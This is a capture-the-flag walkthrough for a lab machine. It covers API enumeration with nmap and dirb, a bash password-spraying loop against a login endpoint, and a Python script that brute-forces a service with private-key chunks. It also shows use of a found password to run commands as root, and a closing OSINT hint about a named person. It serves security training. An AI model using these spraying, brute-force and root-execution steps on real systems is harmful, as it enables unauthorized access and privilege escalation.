## First Flag - API

The first thing we can notice is that the there is some kind of the web server on the port 8080.

```bash
$ nmap -p 8080 localhost -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 13:16 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00032s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

We can notice that it is some kind of Golang web server, and we get 404 on the visit.

If we start fuzzing dirs with dirb or wfuzz we can find `/api/` endpoint with message
```json
{"message": "I have different versions"}
```

So we need to fuzz even more to find the correct version and soon enough we can find the
```/api/v1/```.

Let's see what other endpoints there exists.
```bash
---- Scanning URL: http://localhost:8080/api/v1/ ----
+ http://localhost:8080/api/v1/list (CODE:200|SIZE:74)
+ http://localhost:8080/api/v1/login (CODE:200|SIZE:65)
+ http://localhost:8080/api/v1/users (CODE:200|SIZE:233)
```

We can see three endpoints found by the `dirb`.

Accessing the `/api/v1/users/` return us the list of the users.

```bash
$ curl -L http://localhost:8080/api/v1/users
[
    "root",
    "admin",
    "test",
    "guest",
    "info",
    "adm",
    "mysql",
    "user",
    "administrator",
    "oracle",
    "ftp",
    "pi",
    "puppet",
    "ansible",
    "ec2-user",
    "vagrant",
    "azureuser"
]
```

It is some kind of possible usernames on the API.

Accessing the `/api/v1/list/` gives us the following.

```bash
$ curl http://localhost:8080/api/v1/list
{
    "keys": [
        "user",
        "password",
        "flag"
    ]
}
```

So we can see our flag in there and if we try to access it, we get:

```bash
curl http://localhost:8080/api/v1/list/flag
{"message": "You not to provide FIT-Token header"}
```

So we need to pass FIT-Token header but how could we obtain it.

Let's take a look at the last endpoint found.

```bash
$ curl http://localhost:8080/api/v1/login
{"message": {"You need to pass username and password using JSON"}
```

Ah, so we need to pass username and password in json notation. 
Remember that we already have a list of usernames but not the password so let's use the 
_password spraying_ technique.

We can do it with bash, just prepare your users file to have just a username on each line without any extra 
characters.

```bash
$ for user in $(cat /tmp/new_users); do
for> curl -s -H "Content-Type: application/json" http://localhost:8080/api/v1/login -d "{\"username\": \"${user}\", \"password\":\"password\"}" | grep -v 'Wrong username or password' && echo "Username => ${user}"; done
{"message": "Good job, correct login"}
Username => puppet
```

So our credentials are `puppet` as a username and `password` as password.

If we now try to login with these credentials, we will obtain FIT-Token header in response.

Let's try it out.

```bash
$ curl -v -H "Content-Type: application/json" http://localhost:8080/api/v1/login -d "{\"username\": \"puppet\", \"password\":\"password\"}"
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 8080 (#0)
> POST /api/v1/login HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.64.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 45
>
* upload completely sent off: 45 out of 45 bytes
< HTTP/1.1 200 OK
< Content-Type: application/json; charset=UTF-8
< Fit-Token: <Here goes hashed token>
< Date: Wed, 21 Apr 2021 11:41:04 GMT
< Content-Length: 38
<
* Connection #0 to host localhost left intact
{"message": "Good job, correct login"}* Closing connection 0
```

We can see that we got our `Fit-Token` back. 

For the final step, let's pass it to the the `/api/v1/list/flag` endpoint.
```bash
$ curl -L http://localhost:8080/api/v1/list/flag -X POST -d '{"username":"puppet","password":"password"}' -H "Content-Type: application/json" -H "Fit-Token: 5c0424704212b233164865ab90e81d7f063f1d82"
{
    "key": "flag",
    "value": "6c3ffc11bce4f28ee0b427091cf6aaee90396a0d89fcf51d0d5add369882719a ; Additionally, take a look at the /api/v1/n0tesOfABro"
}
```

After checking out `/api/v1/n0tesOfABro` we can see some username and password there.
```bash
$ curl http://localhost:8080/api/v1/n0tesOfABro -L
{
    "username": "ctf",
    "password": "CtF2021-_-"
}
```

If we try ssh now, we will see that we got in.

# Second Flag - Service 3000

During the initial phase, we could see that the port 3000 is running. If we connect to the service, we can see that we need to provide some kind of username.

```bash
$ nc 192.168.0.1 3000
Username: username
Wrong username!!!
```

So we need to find the correct username to see what is going on in here.

Once we ssh to our machine as `ctf` user we can see that we are inside of some restricted shell.

Inside the home directory, we can find priv_key file. It is all good but we don't know the user whose priv_key is this. 

After digging a bit more, we can see `/etc/passwd.diff` file.

```bash
$ cat /etc/passwd.diff
--- passwd	2021-05-31 07:44:11.170860044 +0000
+++ new_passwd	2021-05-31 07:44:33.841813925 +0000
@@ -32,3 +32,4 @@
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 ctf:x:1000:1000::/home/ctf:/bin/bash
+second:x:1001:1001::/home/second:/bin/bash
```

So, according to the file, there is user called `second`.

If we try to ssh in as user `second` with the private key provided, we would fail.

But, if we try to connect to our 3000 service and provide `second` we would see something else.

```bash
$ nc localhost 3000
Username: second
Ten consecutives characters from the private key:
```

So, it appears that we need to provide 10 chars from the priv_key file, but which one.

If we break each line into an array of 10 chars and then we connect to service 3000 with sending those 10 chars we would eventually get our password back for the user second.

Here is the python script exactly for that.

```python
#!/usr/bin/env python3

import socket

chunk_size = 10
username = 'second\n'
HOST = 'localhost'
PORT = 3000

with open('ctf_priv', 'r') as f:
    content = f.read()
    lines = content.split('\n')[1:]

    for line in lines:
        if "END OPENSSH PRIVATE KEY" in line:
            break
        for i in range(0, len(line), chunk_size):
            word = line[i:i+chunk_size]
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                ret = s.recv(1024)
                s.send(bytes(username, "utf-8"))
                ret = s.recv(1024)
                s.send(bytes(word+"\n", "utf-8"))
                ret = s.recv(1024)
                print("Received", ret.decode("utf-8"))
 ```
 
 After running it, we can see that we got our password back.
 
 ```$ chmod u+x ./script.py
 $ ./script.py
 [ ... REDACTED ... ]
Received Wrong!!! Did you count correctly???
Received Wrong!!! Did you count correctly???
Received Wrong!!! Did you count correctly???
Received Wrong!!! Did you count correctly???
Received Password for the provided username: +zV_H:ERDkBWjR4$
Received Wrong!!! Did you count correctly???
Received Wrong!!! Did you count correctly???
[ ... REDACTED ... ]
```

`ssh second@192.168.0.1` with the password `+zV_H:ERDkBWjR4$` got us inside the second home directory and there we can see our second flag.

# Third flag - Whitespace

Inside the home directory, we can see hidden file called `.bash_history_bkp` and inside of it, we can see that the user was running `sudo vim /etc/willLeaveThisWhitespace`.

If we check the file we can see some random strings.
```bash
$ cat /etc/willLeaveThisWhitespace
S S S T	S S S T	S S L
T	L
S S S S S T	T	T	S T	S T	L
T	L
S S S S S T	T	S S T	S T	L
T	L
S S S S S S T	S S S S S L
T	L
S S S S S T	T	T	S T	S S L
T	L
S S S S S T	T	S T	T	T	T	L
T	L
S S S S S S T	S S S S S L
T	L
S S S S S T	T	T	S T	S S L
T	L
[ ... REDACTED ... ]
```

The first thing we should do in situations like this is to check [dcode.fr](https://www.dcode.fr).
It appears to be some kind of hint inside the filename "Whitespace". If we search for esolang whitespace we can see that indeed there is such language.

Now onto the decoding it on the [https://www.dcode.fr/whitespace-language](https://www.dcode.fr/whitespace-language) we see the message clearly.

![Screenshot 2021-05-31 at 15 53 50](https://user-images.githubusercontent.com/50464613/120203825-6857d880-c228-11eb-85b3-5cb8c1a7314b.png)

We can see some kind of password `iTWasNotThaTHard?Right?123`, but what is it used for.

If we dig a bit more, we would find `/usr/bin/chowned` binary.

```bash
$ /usr/bin/chowned
[-] Please provide password and command
Usage: chowned password command
$ /usr/bin/chowned 'iTWasNotThaTHard?Right?123' whoami
Output:
root
$ /usr/bin/chowned 'iTWasNotThaTHard?Right?123' 'cat /root/fl4g'
fl4g{asdasdfgdgdsfs123}
```

# Fourth Flag - LinkedIn

Inside the `/root/` directory we can see `CV` file with contents:

```bash
$ /usr/bin/chowned 'iTWasNotThaTHard?Right?123' 'cat /root/CV'
Hello,

My name is Zeza Zezic and I am the PR manager at The Coca-Cola Company.

For more information about me, you want to do some OSINT to find more details.

```

If we do some OSINT, we could find a linkedin profile with fl4g{} in about section for the user.
